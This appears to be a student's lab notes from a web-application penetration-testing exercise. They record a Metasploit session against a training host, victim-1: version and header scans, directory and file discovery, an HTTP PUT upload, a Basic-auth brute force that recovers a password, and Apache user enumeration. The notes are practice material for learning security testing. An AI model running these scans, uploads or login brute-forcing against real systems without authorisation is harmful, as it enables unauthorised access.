@@ -1,0 +1,294 @@
+Tools that I have to use 
+  
+    auxiliary/scanner/http/apache_userdir_enum
+    -auxiliary/scanner/http/brute_dirs
+    -auxiliary/scanner/http/dir_scanner
+    -auxiliary/scanner/http/dir_listing
+    auxiliary/scanner/http/http_put
+    -auxiliary/scanner/http/files_dir
+    auxiliary/scanner/http/http_login
+    -auxiliary/scanner/http/http_header
+    -auxiliary/scanner/http/http_version
+    -auxiliary/scanner/http/robots_txt
+
+msf6 > setg RHOSTS victim-1
+  RHOSTS => victim-1
+
+Step 1: 
+msf6 > use auxiliary/scanner/http/http_version 
+msf6 auxiliary(scanner/http/http_version) > exploit
+  
+  [+] 192.200.115.3:80 Apache/2.4.18 (Ubuntu)
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 2:
+msf6 auxiliary(scanner/http/http_version) > use auxiliary/scanner/http/robots_txt 
+msf6 auxiliary(scanner/http/robots_txt) > exploit
+
+  [*] [192.200.115.3] /robots.txt found
+  [+] Contents of Robots.txt:
+  # robots.txt for attackdefense 
+  User-agent: test                     
+  # Directories
+  Allow: /webmail
+  
+  User-agent: *
+  # Directories
+  Disallow: /data
+  Disallow: /secure
+  
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/http/http_header) > curl http://victim-1/secure
+  [*] exec: curl http://victim-1/secure
+  
+  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+  <html><head>
+  <title>401 Unauthorized</title>
+  </head><body>
+  <h1>Unauthorized</h1>
+  <p>This server could not verify that you
+  are authorized to access the document
+  requested.  Either you supplied the wrong
+  credentials (e.g., bad password), or your
+  browser doesn't understand how to supply
+  the credentials required.</p>
+  <hr>
+  <address>Apache/2.4.18 (Ubuntu) Server at victim-1 Port 80</address>
+  </body></html>
+msf6 auxiliary(scanner/http/http_header) > curl http://victim-1/data
+  [*] exec: curl http://victim-1/data
+  
+  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+  <html><head>
+  <title>301 Moved Permanently</title>
+  </head><body>
+  <h1>Moved Permanently</h1>
+  <p>The document has moved <a href="http://victim-1/data/">here</a>.</p>
+  <hr>
+  <address>Apache/2.4.18 (Ubuntu) Server at victim-1 Port 80</address>
+  </body></html>
+
+
+Step 3:
+msf6 auxiliary(scanner/http/robots_txt) > use auxiliary/scanner/http/http_header 
+msf6 auxiliary(scanner/http/http_header) > exploit
+  
+  [+] 192.200.115.3:80     : CONTENT-TYPE: text/html
+  [+] 192.200.115.3:80     : LAST-MODIFIED: Wed, 28 Aug 2024 08:56:57 GMT
+  [+] 192.200.115.3:80     : SERVER: Apache/2.4.18 (Ubuntu)
+  [+] 192.200.115.3:80     : detected 3 headers
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/http/http_header) > set TARGETURI /secure/
+TARGETURI => /secure/
+msf6 auxiliary(scanner/http/http_header) > exploit
+
+  [+] 192.200.115.3:80     : CONTENT-TYPE: text/html; charset=iso-8859-1
+  [+] 192.200.115.3:80     : SERVER: Apache/2.4.18 (Ubuntu)
+  [+] 192.200.115.3:80     : WWW-AUTHENTICATE: Basic realm="Restricted Content"
+  [+] 192.200.115.3:80     : detected 3 headers
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 4:
+msf6 auxiliary(scanner/http/http_header) > use auxiliary/scanner/http/brute_dirs 
+msf6 auxiliary(scanner/http/brute_dirs) > exploit
+
+  [*] Using code '404' as not found.
+  [+] Found http://victim-1:80/doc/ 200
+  [+] Found http://victim-1:80/pro/ 200
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 5:
+msf6 auxiliary(scanner/http/brute_dirs) > use auxiliary/scanner/http/dir_scanner 
+msf6 auxiliary(scanner/http/dir_scanner) > set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
+  DICTIONARY => /usr/share/metasploit-framework/data/wordlists/directory.txt
+msf6 auxiliary(scanner/http/dir_scanner) > exploit
+  
+  [*] Detecting error code
+  [*] Using code '404' as not found for 192.200.115.3
+  [+] Found http://victim-1:80//doc/ 404 (192.200.115.3)
+  [+] Found http://victim-1:80//webdav/ 404 (192.200.115.3)
+  [+] Found http://victim-1:80//manual/ 404 (192.200.115.3)
+  [+] Found http://victim-1:80//icons/ 404 (192.200.115.3)
+  [+] Found http://victim-1:80//data/ 404 (192.200.115.3)
+  [+] Found http://victim-1:80//secure/ 404 (192.200.115.3)
+  [+] Found http://victim-1:80//pro/ 404 (192.200.115.3)
+  [+] Found http://victim-1:80//pro/ 404 (192.200.115.3)
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 6: 
+msf6 auxiliary(scanner/http/dir_scanner) > use auxiliary/scanner/http/dir_listing 
+msf6 auxiliary(scanner/http/dir_listing) > set PATH /data/
+  PATH => /data/
+msf6 auxiliary(scanner/http/dir_listing) > exploit
+  
+  [+] Found Directory Listing http://victim-1:80/data/
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/dir_listing) > set PATH /secure/
+  PATH => /secure/
+msf6 auxiliary(scanner/http/dir_listing) > exploit
+  
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 7:
+msf6 auxiliary(scanner/http/dir_listing) > use auxiliary/scanner/http/files_dir
+msf6 auxiliary(scanner/http/files_dir) > set VERBOSE false
+  VERBOSE => false
+msf6 auxiliary(scanner/http/files_dir) > exploit
+  
+  [*] Using code '404' as not found for files with extension .null
+  [*] Using code '404' as not found for files with extension .backup
+  [+] Found http://victim-1:80/file.backup 200
+  [*] Using code '404' as not found for files with extension .bak
+  [*] Using code '404' as not found for files with extension .c
+  [+] Found http://victim-1:80/code.c 200
+  [*] Using code '404' as not found for files with extension .cfg
+  [+] Found http://victim-1:80/code.cfg 200
+  [*] Using code '404' as not found for files with extension .class
+  [*] Using code '404' as not found for files with extension .copy
+  [*] Using code '404' as not found for files with extension .conf
+  [*] Using code '404' as not found for files with extension .exe
+  [*] Using code '404' as not found for files with extension .html
+  [+] Found http://victim-1:80/index.html 200
+  [*] Using code '404' as not found for files with extension .htm
+  [*] Using code '404' as not found for files with extension .ini
+  [*] Using code '404' as not found for files with extension .log
+  [*] Using code '404' as not found for files with extension .old
+  [*] Using code '404' as not found for files with extension .orig
+  [*] Using code '404' as not found for files with extension .php
+  [+] Found http://victim-1:80/test.php 200
+  [*] Using code '404' as not found for files with extension .tar
+  [*] Using code '404' as not found for files with extension .tar.gz
+  [*] Using code '404' as not found for files with extension .tgz
+  [*] Using code '404' as not found for files with extension .tmp
+  [*] Using code '404' as not found for files with extension .temp
+  [*] Using code '404' as not found for files with extension .txt
+  [*] Using code '404' as not found for files with extension .zip
+  [*] Using code '404' as not found for files with extension ~
+  [*] Using code '404' as not found for files with extension 
+  [+] Found http://victim-1:80/cgi-bin 301
+  [+] Found http://victim-1:80/data 301
+  [+] Found http://victim-1:80/doc 301
+  [+] Found http://victim-1:80/downloads 301
+  [+] Found http://victim-1:80/manual 301
+  [+] Found http://victim-1:80/secure 401
+  [+] Found http://victim-1:80/uploads 301
+  [+] Found http://victim-1:80/users 301
+  [+] Found http://victim-1:80/view 301
+  [+] Found http://victim-1:80/webadmin 301
+  [+] Found http://victim-1:80/webdav 401
+  [+] Found http://victim-1:80/webmail 301
+  [+] Found http://victim-1:80/~bin 403
+  [+] Found http://victim-1:80/~mail 403
+  [+] Found http://victim-1:80/~sys 403
+  [*] Using code '404' as not found for files with extension 
+  [+] Found http://victim-1:80/cgi-bin 301
+  [+] Found http://victim-1:80/data 301
+  [+] Found http://victim-1:80/doc 301
+  [+] Found http://victim-1:80/downloads 301
+  [+] Found http://victim-1:80/manual 301
+  [+] Found http://victim-1:80/secure 401
+  [+] Found http://victim-1:80/uploads 301
+  [+] Found http://victim-1:80/users 301
+  [+] Found http://victim-1:80/view 301
+  [+] Found http://victim-1:80/webadmin 301
+  [+] Found http://victim-1:80/webdav 401
+  [+] Found http://victim-1:80/webmail 301
+  [+] Found http://victim-1:80/~bin 403
+  [+] Found http://victim-1:80/~mail 403
+  [+] Found http://victim-1:80/~sys 403
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 8:
+msf6 auxiliary(scanner/http/files_dir) > use auxiliary/scanner/http/http_put 
+msf6 auxiliary(scanner/http/http_put) > set PATH /data/
+  PATH => /data/
+msf6 auxiliary(scanner/http/http_put) > set FILENAME test.txt
+  FILENAME => test.txt
+msf6 auxiliary(scanner/http/http_put) > set FILEDATA "Agarrame el Shaiiko"
+  FILEDATA => Agarrame el Shaiiko
+msf6 auxiliary(scanner/http/http_put) > exploit
+  
+  [+] File uploaded: http://192.200.115.3:80/data/test.txt
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+┌──(root㉿INE)-[~]
+└─# wget http://victim-1/data/test.txt
+  --2025-04-28 18:09:02--  http://victim-1/data/test.txt
+  Resolving victim-1 (victim-1)... 192.200.115.3
+  Connecting to victim-1 (victim-1)|192.200.115.3|:80... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 19 [text/plain]
+  Saving to: ‘test.txt’
+  
+  test.txt                               100%[===========================================================================>]      19  --.-KB/s    in 0s      
+  
+  2025-04-28 18:09:02 (2.34 MB/s) - ‘test.txt’ saved [19/19]
+
+
+┌──(root㉿INE)-[~]
+└─# cat test.txt                                                                                                                                           
+  Agarrame el Shaiiko
+
+msf6 auxiliary(scanner/http/http_put) > set ACTION DELETE
+  ACTION => DELETE
+msf6 auxiliary(scanner/http/http_put) > exploit
+
+  [+] File deleted: http://192.200.115.3:80/data/test.txt
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+
+Step 9:
+msf6 auxiliary(scanner/http/http_put) > use auxiliary/scanner/http/http_login 
+msf6 auxiliary(scanner/http/http_login) > set AUTH_URI /secure/
+  AUTH_URI => /secure/
+msf6 auxiliary(scanner/http/http_login) > set VERBOSE false
+  VERBOSE => false
+msf6 auxiliary(scanner/http/http_login) > exploit
+  
+  [*] Attempting to login to http://victim-1:80/secure/ (192.200.115.3)
+  [+] 192.200.115.3:80 - Success: 'bob:123321'
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Step 10:
+msf6 auxiliary(scanner/http/http_login) > use auxiliary/scanner/http/apache_userdir_enum 
+msf6 auxiliary(scanner/http/apache_userdir_enum) > set VERBOSE false
+  VERBOSE => false
+msf6 auxiliary(scanner/http/apache_userdir_enum) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+  USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
+msf6 auxiliary(scanner/http/apache_userdir_enum) > exploit
+
+  [+] http://192.200.115.3/ - Apache UserDir: 'backup' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'bin' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'daemon' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'games' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'gnats' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'irc' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'list' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'lp' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'mail' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'man' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'news' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'nobody' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'proxy' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'sync' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'sys' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'uucp' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'bob' found 
+  [+] http://192.200.115.3/ - Apache UserDir: 'alice' found 
+  [+] http://192.200.115.3/ - Users found: alice, backup, bin, bob, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, proxy, sync, sys, uucp
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
